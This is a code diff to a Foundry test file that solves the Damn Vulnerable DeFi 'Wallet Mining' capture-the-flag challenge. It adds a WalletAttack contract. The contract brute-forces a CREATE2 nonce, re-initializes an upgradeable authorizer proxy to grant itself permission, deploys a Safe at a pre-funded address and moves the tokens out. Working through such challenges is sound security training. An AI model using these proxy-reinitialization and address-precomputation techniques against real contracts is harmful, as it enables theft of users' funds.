@@ -24,6 +24,7 @@ import {
     SAFE_SINGLETON_FACTORY_ADDRESS,
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -157,7 +158,22 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        // so what i would need to do is to
+        // 1. brute force to find the nonce that would give me the correct address of wallet (0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496)
+        // 2. call init again through the transparent proxy with my address and aim
+        // 3. call drop from walletdeployer which will deploy the wallet at the target address
+        // 4. use user's private key? to successfully call exectransaction on the safe wallet
+        new WalletAttack(
+            deployer,
+            user,
+            singletonCopy,
+            proxyFactory,
+            authorizer,
+            walletDeployer,
+            token,
+            userPrivateKey,
+            ward
+        );
     }
 
     /**
@@ -188,5 +204,149 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+contract WalletAttack {
+    address deployer;
+    address user;
+    Safe singletonCopy;
+    SafeProxyFactory proxyFactory;
+    uint256 nonce;
+    AuthorizerUpgradeable authorizer;
+    WalletDeployer walletDeployer;
+    DamnValuableToken token;
+    uint256 userPrivateKey;
+    address ward;
+
+    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
+    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
+
+    enum Operation {
+        Call,
+        DelegateCall
+    }
+
+    constructor(address _deployer, address _user, Safe _singletonCopy, 
+        SafeProxyFactory _proxyFactory, AuthorizerUpgradeable _authorizer, 
+        WalletDeployer _walletDeployer, DamnValuableToken _token, uint256 _userPrivateKey,
+        address _ward)
+    {
+        deployer = _deployer;
+        user = _user;
+        singletonCopy = _singletonCopy;
+        proxyFactory = _proxyFactory;
+        authorizer = _authorizer;
+        walletDeployer = _walletDeployer;
+        token = _token;
+        userPrivateKey = _userPrivateKey;
+        ward = _ward;
+
+        // 1. find the nonce that will give me the correct address of Safe Wallet deployed
+        findNonce();
+        // 2. Call init again through the proxy with this address and aim
+        changeWards();
+        // 3. Call drop from walletdeployer to deploy the wallet at the target address 
+        callDrop();
+        // 4. Transfer the tokens in the wallet to the user & transfer tokens to ward
+        transferTokens();
+    }
+
+    function findNonce() internal {
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        // assuming that all they used was the owner and threshold and nothing else
+        bytes memory initializer = abi.encodeWithSelector(
+            Safe.setup.selector, 
+            owners,
+            1,
+            address(0),
+            "",
+            address(0),
+            address(0),
+            0,
+            payable(0)
+        );
+
+        for (uint256 _nonce = 0; _nonce < 1000000; _nonce++) {
+            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), _nonce));
+            address target = vm.computeCreate2Address(
+                salt,
+                keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))))),
+                address(proxyFactory)
+            );
+            if (target == USER_DEPOSIT_ADDRESS) {
+                nonce = _nonce;
+                break;
+            }
+        }
+    }
+
+    function changeWards() internal {
+        address[] memory wards = new address[](1);
+        wards[0] = address(this);
+        address[] memory aims = new address[](1);
+        aims[0] = USER_DEPOSIT_ADDRESS;
+
+        authorizer.init(wards, aims);
+    }
+
+    function callDrop() internal {
+        // 1. Set up the initializer for the Safe Wallet
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        bytes memory initializer = abi.encodeWithSelector(
+            Safe.setup.selector, 
+            owners,
+            1,
+            address(0),
+            "",
+            address(0),
+            address(0),
+            0,
+            payable(0)
+        );
+        walletDeployer.drop(
+            USER_DEPOSIT_ADDRESS,
+            initializer,
+            nonce
+        );
+    }
+
+    function transferTokens() internal {
+        Safe userWallet = Safe(USER_DEPOSIT_ADDRESS);
+        bytes memory data = abi.encodeWithSelector(
+            IERC20.transfer.selector,
+            user,
+            DEPOSIT_TOKEN_AMOUNT
+        );
+        bytes32 txHash = userWallet.getTransactionHash(
+            token, 
+            0, 
+            data, 
+            Operation.Call, 
+            0, 
+            0, 
+            0, 
+            address(0), 
+            address(0), 
+            userWallet.nonce()
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        bool success = userWallet.execTransaction(
+            token,
+            0,
+            data,
+            Operation.Call,
+            0,
+            0,
+            0,
+            address(0),
+            address(0),
+            signature
+        );
+        require(success, "Transaction failed :(");
+        token.transfer(ward, token.balanceOf(address(this)));
     }
 }
